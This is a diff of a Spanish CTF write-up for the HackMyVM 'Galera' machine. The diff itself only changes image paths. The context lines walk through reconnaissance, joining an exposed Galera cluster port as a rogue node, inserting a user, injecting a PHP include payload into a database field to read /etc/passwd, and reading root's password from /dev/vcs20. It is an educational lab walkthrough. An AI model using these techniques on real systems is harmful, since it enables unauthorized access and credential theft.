@@ -5,7 +5,7 @@ title: WriteUp Galera - HackMyVM
 slug: galera-writeup-hackmyvm-es
 featured: true
 draft: false
-ogImage: "assets/galera/OpenGraph.png"
+ogImage: "../../../assets/images/galera/OpenGraph.png"
 tags:
     - HackMyVM
     - Galera Cluster
@@ -16,13 +16,13 @@ description:
 lang: es
 ---
 
-![Machine](/assets/galera/vm.png)
+![Machine](../../../assets/images/galera/vm.png)
 
 ## Introducción / Motivación
 
 Después de estar viendo los directos en Twitch de [CursosDeDesarrollo](https://blog.cursosdedesarrollo.com/) peleándose para instalar un clúster de `MariaDB` con `MariaDB Galera Cluster`, me di cuenta de que si no se protege adecuadamente el puerto de Galera (puerto `4567`), se podría crear un nodo malicioso para modificar las bases de datos del clúster. Este CTF intenta reproducir el problema, entre otras cosas. Además, como no había creado ningún CTF para [HackMyVM](https://hackmyvm.eu), esta era la oportunidad.
 
-![HackMyVM](/assets/galera/imagenhackmyvm.png)
+![HackMyVM](../../../assets/images/galera/imagenhackmyvm.png)
 
 ## Tabla de contenido
 
@@ -32,35 +32,35 @@ Después de estar viendo los directos en Twitch de [CursosDeDesarrollo](https://
 ping -c 1 192.168.1.188
 ```
 
-![Ping](/assets/galera/ping.png)
+![Ping](../../../assets/images/galera/ping.png)
 
 ```bash
 nmap -p- -sS -Pn -n 192.168.1.188
 ```
 
-![Nmap Scan](/assets/galera/nmap.png)
+![Nmap Scan](../../../assets/images/galera/nmap.png)
 
 ```bash
 nmap -p22,80,4567 -sVC -Pn -n 192.168.1.188
 ```
 
-![Nmap Scan](/assets/galera/nmap2.png)
+![Nmap Scan](../../../assets/images/galera/nmap2.png)
 
 ```bash
 whatweb 192.168.1.188
 ```
 
-![whatweb](/assets/galera/whatweb.png)
+![whatweb](../../../assets/images/galera/whatweb.png)
 
 ```bash
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.188 -x .php,.txt,.htm,.html,.zip
 ```
 
-![Fuzz dirs](/assets/galera/fuzz-dirs.png)
+![Fuzz dirs](../../../assets/images/galera/fuzz-dirs.png)
 
 ## Enumeración manual
 
-![Nmap Scan](/assets/galera/web.png)
+![Nmap Scan](../../../assets/images/galera/web.png)
 
 Código fuente de la página web.
 
@@ -180,7 +180,7 @@ Ejecutamos el docker compose ...
 docker compose up -d
 ```
 
-![Docker compose](/assets/galera/docker-compose.png)
+![Docker compose](../../../assets/images/galera/docker-compose.png)
 
 ... y comprobamos que el contenedor esté levantado ...
 
@@ -200,7 +200,7 @@ Ahora dentro de nuestra BD local comprobamos que Galera se haya sincronizado env
 SHOW STATUS LIKE 'wsrep_local_state_comment';
 ```
 
-![Test galera](/assets/galera/test-galera.png)
+![Test galera](../../../assets/images/galera/test-galera.png)
 
 Si en `Value` aparece `Synced`, quiere decir que nuestro servidor se ha añadido como nodo al clúster de Galera, podemos ver otros parámetros de Galera con el siguiente comando SQL.
 
@@ -220,7 +220,7 @@ show databases;
 use galeradb; show tables;
 ```
 
-![SQL galera](/assets/galera/sql-galera.png)
+![SQL galera](../../../assets/images/galera/sql-galera.png)
 
 Vemos que en la tabla existe un usuario admin, pero no conseguiremos crackear el hash de su contraseña, pero podemos añadir otros usuarios. Primero tenemos que averiguar qué tipo de hash es.
 
@@ -228,13 +228,13 @@ Vemos que en la tabla existe un usuario admin, pero no conseguiremos crackear el
 select * from users\G
 ```
 
-![SQL table users](/assets/galera/table-users.png)
+![SQL table users](../../../assets/images/galera/table-users.png)
 
 ```bash
 hashid '$2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq'
 ```
 
-![hash id](/assets/galera/hash-id.png)
+![hash id](../../../assets/images/galera/hash-id.png)
 
 Observamos que está con bcrypt, creamos un hash para la contraseña `password`.
 
@@ -242,7 +242,7 @@ Observamos que está con bcrypt, creamos un hash para la contraseña `password`.
 python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(rounds=10)).decode())"
 ```
 
-![hash bcrypt](/assets/galera/hash-bcrypt.png)
+![hash bcrypt](../../../assets/images/galera/hash-bcrypt.png)
 
 y lo utilizamos para crear un nuevo usuario en nuestro nodo del clúster en Docker.
 
@@ -250,11 +250,11 @@ y lo utilizamos para crear un nuevo usuario en nuestro nodo del clúster en Dock
 INSERT INTO users (username, email, password) VALUES ('lenam','lenam@lenam.com','$2b$10$.9rNY2PmaVl3fan4XsRCEe3IWVAeFGHGFCWx1XFnNg/fBqZwZqXfa');
 ```
 
-![SQL user lenam](/assets/galera/users-lenam.png)
+![SQL user lenam](../../../assets/images/galera/users-lenam.png)
 
 Nos vamos al sitio web con el formulario de login que aparecía en el puerto 80 e intentamos validar nuestro usuario creado. Conseguimos entrar a la página `private.php`.
 
-![SQL user lenam](/assets/galera/private-web.png)
+![SQL user lenam](../../../assets/images/galera/private-web.png)
 
 ### LFI
 
@@ -262,7 +262,7 @@ En la página `private.php` encontramos un formulario con diferentes botones que
 
 En la dirección encontrada mediante fuzzing de `/info.php`, encontramos la clásica salida de `phpInfo();` donde podemos observar diferentes cosas importantes como el parámetro `disable_functions` y que está instalado el módulo `SPL` en el servidor.
 
-![SQL user lenam](/assets/galera/php-disable-functions.png)
+![SQL user lenam](../../../assets/images/galera/php-disable-functions.png)
 
 Como se puede observar en `disable_functions`, tenemos prácticamente todas las funciones para conseguir RCE deshabilitadas, pero podremos utilizar `include()`, `file_put_contents()` y todas las funciones de `SPL` útiles para evadir las `disable_functions`.
 
@@ -280,7 +280,7 @@ UPDATE users SET email="<?php include('/etc/passwd'); ?>" WHERE username='lenam'
 
 Cerramos la sesion de nuestro usuario si la teniamos iniciada y volvemos a entrar, publicamos un mensaje cualquiera y despues hacemos clic en el boton `View`, conseguimos obtener el fichero `/etc/passwd` del servidor.
 
-![LFI](/assets/galera/lfi.png)
+![LFI](../../../assets/images/galera/lfi.png)
 
 Podemos observar que además de root y los típicos usuarios del SO también existe el usuario `donjuandeaustria`.
 
@@ -300,13 +300,13 @@ Entramos mediante SSH al servidor con este usuario y contraseña y obtenemos la 
 ssh donjuandeaustria@192.168.1.188
 ```
 
-![User flag](/assets/galera/user-flag.png)
+![User flag](../../../assets/images/galera/user-flag.png)
 
 ## Escalada de privilegios
 
 Si comprobamos los grupos a los que pertenece el usuario `id`, podremos observar que pertenece al grupo `tty`, y si observamos si hay algún usuario que haya iniciado una tty `w`, veremos que root ha iniciado una tty con bash.
 
-![Info escalada](/assets/galera/escalada-info.png)
+![Info escalada](../../../assets/images/galera/escalada-info.png)
 
 Al pertenecer al grupo `tty`, podemos observar la salida de la consola `tty` (lo que están viendo) de otros usuarios. Solo tenemos que consultar el contenido del fichero `/dev/vcs{n}` o `/dev/vcsa{n}`.
 
@@ -316,11 +316,11 @@ Si leemos el contenido del fichero `/dev/vcs20`, el tty del usuario `root`, obte
 cat /dev/vcs20
 ```
 
-![Shell root](/assets/galera/root-password.png)
+![Shell root](../../../assets/images/galera/root-password.png)
 
 Entramos como usuario root con la contraseña obtenida y leemos la flag de root.txt.
 
-![root flag](/assets/galera/root-flag.png)
+![root flag](../../../assets/images/galera/root-flag.png)
 
 
 En este laboratorio se puede observar la importancia de proteger los puertos o la red de Galera Cluster o, como mínimo, utilizar otro método SST que permita la validación por certificado o contraseña.
